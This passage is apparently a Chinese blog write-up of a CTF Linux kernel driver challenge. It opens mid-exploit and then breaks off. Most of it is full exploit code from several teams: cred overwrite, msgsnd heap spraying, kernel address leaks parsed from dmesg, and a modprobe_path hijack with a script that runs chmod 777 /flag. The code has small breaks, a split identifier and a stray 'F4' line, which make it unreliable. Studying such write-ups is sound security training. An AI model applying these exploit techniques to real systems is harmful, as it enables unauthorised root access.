class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;[S3] Overwriting cred\n&quot;</span>);<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> write_addr = cred_addr + <span class="hljs-number">8</span> * <span class="hljs-number">3</span>;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> idx = (write_addr - s1_dist_addr) / <span class="hljs-number">8</span>;<br>    reclaim_free(ctx);<br>    reclaim_alloc(ctx, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, idx, <span class="hljs-number">0</span>);<br>    query(graph_fds[<span class="hljs-number">0</span>], graph_fds[<span class="hljs-number">1</span>]);  <span class="hljs-comment">//kmalloc the orignal s1_dist_addr</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">print_flag</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> fd = open(<span class="hljs-string">&quot;/flag&quot;</span>, O_RDONLY);<br>    assert(fd != <span class="hljs-number">-1</span>);<br><br>    <span class="hljs-keyword">char</span> buf[<span class="hljs-number">100</span>];<br>    <span class="hljs-built_in">memset</span>(buf, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(buf));<br>    assert(read(fd, buf, <span class="hljs-keyword">sizeof</span>(buf) - <span class="hljs-number">1</span>) != <span class="hljs-number">-1</span>);<br>    close(fd);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;!!! FLAG: %s\n&quot;</span>, buf);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">//*what are these?</span><br>    <span class="hljs-keyword">int</span> scratch_fds[<span class="hljs-number">12</span>];<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">12</span>; i++)<br>        scratch_fds[i] = create();<br><br>    <span class="hljs-comment">// Leak a distance array (still malloc&#x27;ed) and the address of a live node</span><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> s1_dist_addr, s1_node_addr;<br>    <span class="hljs-keyword">int</span> s1_node_fd;<br>    stage1(&amp;s1_dist_addr, &amp;s1_nod e_addr, &amp;s1_node_fd);<br><br>    <span class="hljs-comment">// Get a fd that can be freed and reclaimed repeatedly</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">reclaim_ctx</span> <span class="hljs-title">victim_ctx</span>;</span><br>    <span class="hljs-keyword">int</span> victim_fd;<br>    stage2(&amp;victim_ctx, &amp;victim_fd);<br><br>    <span class="hljs-comment">// Get somewhat rootish privileges</span><br>    stage3(&amp;victim_ctx, victim_fd, scratch_fds, s1_dist_addr, s1_node_addr);<br><span class="hljs-function">F4</span><br><span class="hljs-function">    <span class="hljs-title">print_flag</span><span class="hljs-params">()</span></span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="来自perfectblue的exp"><a href="#来自perfectblue的exp" class="headerlink" title="来自perfectblue的exp:"></a>来自perfectblue的exp:</h3><p>mutex的结构: </p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mutex</span> &#123;</span><br>  <span class="hljs-keyword">uint64_t</span> owner;<br>  <span class="hljs-keyword">uint64_t</span> wait_lock;<br>  <span class="hljs-keyword">void</span>* prev;<br>  <span class="hljs-keyword">void</span>* next;<br>&#125;;<br></code></pre></div></td></tr></table></figure><p>改进细节:</p><ul><li>第一次crash可以使用<code>refcount_warn_saturate</code>. 这样只要令refcount等于0, 就会触发finalize中的警告, 从而导致crash的产生, 不过exp中简单的使用了sleep等待线程, 以及手动输入dmesg信息. 上面一个战队的exp中解析内核日志的代码可以拿来重复利用, 免得在调试的时候浪费时间.<br>好吧这很有问题, 进入了这个函数之后寄存器值都变了. 不好评价. </li><li>好了, 看不懂那个leak出来的是个啥, 什么是kmalloc_32/128???也没个wp解释一下. </li></ul><h4 id="exp-略"><a href="#exp-略" class="headerlink" title="exp: 略"></a>exp: 略</h4><h3 id="来自balsn战队"><a href="#来自balsn战队" class="headerlink" title="来自balsn战队:"></a>来自balsn战队:</h3><p>仅仅两百多行, 这么简洁. </p><ul><li>crash用到了<code>refcount_warn_saturate</code>. 原因是finalize之前release会使refcount变0. </li><li>用到了msgsnd, 也就是kmalloc有最大和最小长度限制, 而且有一个0x30(48)字节的头部. </li><li>msgsnd只能控制后0x50的区域. 也就是<strong>最后四行</strong> </li></ul><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node_t</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-keyword">uint64_t</span> id;<br>  <span class="hljs-keyword">uint64_t</span> refcount;<br>  <span class="hljs-keyword">char</span> state_lock[<span class="hljs-number">32</span>];<br>  <span class="hljs-keyword">uint64_t</span> is_finalized;<br>  <span class="hljs-keyword">char</span> nb_lock[<span class="hljs-number">32</span>];<br>  <span class="hljs-comment">//following is under control</span><br>  <span class="hljs-keyword">uint64_t</span> num_children;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head_t</span> <span class="hljs-title">edges</span>;</span><br>  <span class="hljs-keyword">uint64_t</span> traversal_idx;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node_list_t</span> *<span class="hljs-title">traversal</span>;</span><br>&#125;;<br></code></pre></div></td></tr></table></figure><ul><li>不知道怎么得出的rbx中存储kernel_heap, 不过可能是从崩溃信息中对比和真实heap最接近的一个寄存器地址. </li><li>用了一个很巧妙的方法来获取dis_arr的地址, 在用户区建立一个很大的缓冲区, 猜测在已有的heap地址附近, 让idx偏移越界溢出从内核地址绕回到缓冲区中, 检查哪个地址上的数据被修改就可推算真实的dis_arr. 再根据dis_arr来算出和modprobe的地址. 进而修改到shellcode函数中.<br>可行的原因为未开smep+smap. </li></ul><p>遇到的问题:</p><ul><li>读取内核错误信息莫名出错, 换成了<code>klogctl</code>才成功. 修改用参数来crash的神奇操作. 修改kernel_ret为query的返回地址在栈上的存储位置. </li></ul><p>modprobe:</p><p>重点在于造一个头部未知的程序. 执行后内核自会使用<code>/tmp/y</code>处理, 然而它只修改了<code>/flag</code>的权限就退出了. 正好也是我们的目的. </p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">!/bin/sh</span>                                           <br>echo -ne &#x27;\xffyyy&#x27; &gt; fake<br>echo -ne &#x27;#!/bin/sh\n/bin/chmod 777 /flag&#x27; &gt; /tmp/y<br>chmod +x fake<br>chmod +x /tmp/y<br>/balsn<br>/balsn<br>/balsn<br>cat /flag<br></code></pre></div></td></tr></table></figure><h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp:"></a>exp:</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">// musl-gcc exp.c -o exp -static -masm=intel</span><br><span class="hljs-comment">//</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;signal.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;assert.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdint.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SPARK_LINK 0x4008D900</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SPARK_GET_INFO 0x8018D901</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SPARK_FINALIZE 0xD902</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SPARK_QUERY 0xC010D903</span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PAUSE scanf(<span class="hljs-meta-string">&quot;%*c&quot;</span>);</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">spark_ioctl_query</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-keyword">int</span> fd1;<br>    <span class="hljs-keyword">int</span> fd2;<br>    <span class="hljs-keyword">size_t</span> distance;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Link_Header</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Link_Header</span> *<span class="hljs-title">fd</span>, *<span class="hljs-title">bk</span>;</span><br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-keyword">size_t</span> id;<br>    <span class="hljs-keyword">size_t</span> refcount;<br>    <span class="hljs-keyword">size_t</span> state_lock[<span class="hljs-number">4</span>];<br>    <span class="hljs-keyword">size_t</span> finalized;<br>    <span class="hljs-keyword">size_t</span> nb_lock[<span class="hljs-number">4</span>];<br>    <span class="hljs-keyword">size_t</span> num_edges;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Link_Header</span> <span class="hljs-title">link_header</span>;</span><br>    <span class="hljs-keyword">size_t</span> index;<br>    <span class="hljs-keyword">size_t</span> tra;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Edge</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Link_Header</span> <span class="hljs-title">link_header</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span> *<span class="hljs-title">dst_node</span>;</span><br>    <span class="hljs-keyword">size_t</span> weight;<br>&#125;;<br><br><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> fd[<span class="hljs-number">100</span>];<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">link</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a, <span class="hljs-keyword">int</span> b, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> weight)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">// printf(&quot;Creating link between &#x27;%d&#x27; and &#x27;%d&#x27; with weight %u\n&quot;, a, b, weight);</span><br>    assert(ioctl(fd[a], SPARK_LINK, fd[b] | ((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span>)weight &lt;&lt; <span class="hljs-number">32</span>)) == <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">query</span><span class="hljs-params">(<span class="hljs-keyword">int</span> i, <span class="hljs-keyword">int</span> a, <span class="hljs-keyword">int</span> b)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">spark_ioctl_query</span> <span class="hljs-title">qry</span> =</span> &#123;<br>        .fd1 = fd[a],<br>        .fd2 = fd[b],<br>    &#125;;<br>    <span class="hljs-keyword">int</span> ret = ioctl(fd[i], SPARK_QUERY, &amp;qry);<br>    <span class="hljs-comment">// printf( &quot;[query] ret = %d\n&quot; , ret );</span><br>    <span class="hljs-comment">// printf(&quot;The length of shortest path between &#x27;%d&#x27; and &#x27;%d&#x27; is %lld\n&quot;, a, b, qry.distance);</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">get_info</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">size_t</span> buf[<span class="hljs-number">3</span>];<br>    <span class="hljs-built_in">memset</span>(buf, <span class="hljs-number">0xcc</span>, <span class="hljs-keyword">sizeof</span>(buf));<br>    assert(ioctl(fd[a], SPARK_GET_INFO, buf) == <span class="hljs-number">0</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[get info %d] &quot;</span>, a);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">3</span>; ++i)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%p &quot;</span>, buf[i]);<br>    &#125;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;&quot;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">spark_open</span><span class="hljs-params">(<span class="hljs-keyword">int</span> i)</span></span><br><span class="hljs-function"></span>&#123;<br>    fd[i] = open(<span class="hljs-string">&quot;/dev/node&quot;</span>, O_RDWR);<br>    assert(fd[i] &gt;= <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">spark_close</span><span class="hljs-params">(<span class="hljs-keyword">int</span> i)</span></span><br><span class="hljs-function"></span>&#123;<br>    close(fd[i]);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">spark_finalize</span><span class="hljs-params">(<span class="hljs-keyword">int</span> i)</span></span><br><span class="hljs-function"></span>&#123;<br>    ioctl(fd[i], SPARK_FINALIZE);<br>&#125;<br><br><span class="hljs-comment">// for kmalloc</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/msg.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/ipc.h&gt;</span></span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">MsgBuf</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-keyword">long</span> mtype;<br>    <span class="hljs-keyword">char</span> mtext[<span class="hljs-number">0x10000</span>]; <span class="hljs-comment">// 65536</span><br>&#125; msgbuf;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">msg_open</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> qid;<br>    <span class="hljs-keyword">if</span> ((qid = msgget(IPC_PRIVATE, <span class="hljs-number">0644</span> | IPC_CREAT)) == <span class="hljs-number">-1</span>)<br>    &#123;<br>        perror(<span class="hljs-string">&quot;msgget&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> qid;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">msg_send</span><span class="hljs-params">(<span class="hljs-keyword">int</span> qid, <span class="hljs-keyword">char</span> *data, <span class="hljs-keyword">size_t</span> size)</span></span><br><span class="hljs-function"></span>&#123;<br>    msgbuf.mtype = <span class="hljs-number">1</span>;<br>    <span class="hljs-built_in">memcpy</span>(msgbuf.mtext, &amp;data[<span class="hljs-number">0x30</span>], size - <span class="hljs-number">0x30</span>);<br>    <span class="hljs-keyword">if</span> (msgsnd(qid, &amp;msgbuf, size - <span class="hljs-number">0x30</span>, <span class="hljs-number">0</span>) == <span class="hljs-number">-1</span>)<br>    &#123;<br>        perror(<span class="hljs-string">&quot;msgsnd&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">msg_free</span><span class="hljs-params">(<span class="hljs-keyword">int</span> qid, <span class="hljs-keyword">size_t</span> size)</span></span><br><span class="hljs-function"></span>&#123;<br>    msgbuf.mtype = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">if</span> (msgrcv(qid, &amp;msgbuf, size - <span class="hljs-number">0x30</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>) == <span class="hljs-number">-1</span>)<br>    &#123;<br>        perror(<span class="hljs-string">&quot;msgsnd&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">arb_write</span><span class="hljs-params">(<span class="hljs-keyword">int</span> qid, <span class="hljs-keyword">size_t</span> off)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span> <span class="hljs-title">data</span> =</span> &#123;<br>        .index = off,<br>    &#125;;<br><br>    <span class="hljs-comment">// change content</span><br>    msg_free(qid, <span class="hljs-number">0x80</span>);<br>    msg_send(qid, &amp;data, <span class="hljs-number">0x80</span>);<br><br>    query(<span class="hljs-number">20</span>, <span class="hljs-number">20</span>, <span class="hljs-number">22</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">crash</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] Crashing...&quot;</span>);<br>    spark_open(<span class="hljs-number">0</span>);<br>    spark_open(<span class="hljs-number">1</span>);<br>    link(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>    spark_close(<span class="hljs-number">1</span>);<br>    spark_finalize(<span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-keyword">size_t</span> kernel_stack, kernel_heap;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">leak</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> pid = fork();<br>    <span class="hljs-keyword">if</span> (pid == <span class="hljs-number">0</span>)<br>    &#123;<br>        crash();<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    sleep(<span class="hljs-number">0.5</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] get info from dmesg\n&quot;</span>);<br><br>    <span class="hljs-keyword">int</span> i, sz;<br>    <span class="hljs-keyword">char</span> *buf;<br>    <span class="hljs-comment">//*query the size of the kernel ring buffer</span><br>    sz = klogctl(<span class="hljs-number">10</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>);<br>    assert(sz != <span class="hljs-number">-1</span>);<br>    buf = <span class="hljs-built_in">malloc</span>(sz);<br>    <span class="hljs-comment">//*read all message from the kernel buffer into @buf.</span><br>    assert(klogctl(<span class="hljs-number">3</span>, buf, sz) != <span class="hljs-number">-1</span>);<br>    <span class="hljs-comment">// size_t kernel_heap, kernel_stack;</span><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; sz &amp;&amp; (!kernel_stack || !kernel_heap); i++)<br>    &#123;<br>        <span class="hljs-comment">//*rax stores dis_arr</span><br>        <span class="hljs-keyword">if</span> (!kernel_stack &amp;&amp; !<span class="hljs-built_in">strncmp</span>(buf + i, <span class="hljs-string">&quot;RSP: 0018:&quot;</span>, <span class="hljs-number">5</span>))<br>        &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">sscanf</span>(buf + i + <span class="hljs-number">10</span>, <span class="hljs-string">&quot;%lx&quot;</span>, &amp;kernel_stack) != <span class="hljs-number">1</span>)<br>                kernel_stack = <span class="hljs-number">0</span>;<br>        &#125;<br>        <span class="hljs-comment">//*r9 stores the edge</span><br>        <span class="hljs-keyword">if</span> (!kernel_heap &amp;&amp; !<span class="hljs-built_in">strncmp</span>(buf + i, <span class="hljs-string">&quot;RBX: &quot;</span>, <span class="hljs-number">5</span>))<br>        &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">sscanf</span>(buf + i + <span class="hljs-number">5</span>, <span class="hljs-string">&quot;%lx&quot;</span>, &amp;kernel_heap) != <span class="hljs-number">1</span>)<br>                kernel_heap = <span class="hljs-number">0</span>;<br>        &#125;<br>    &#125;<br>    assert(kernel_stack &amp;&amp; kernel_heap);<br>    <span class="hljs-built_in">free</span>(buf);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] Leak kernel stack addr: %p\n&quot;</span>, kernel_stack);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] Leak kernel heap addr: %p\n&quot;</span>, kernel_heap);<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">0xffff98d5cdd2be80:0xffffffffffffffff0x000000000088770f</span><br><span 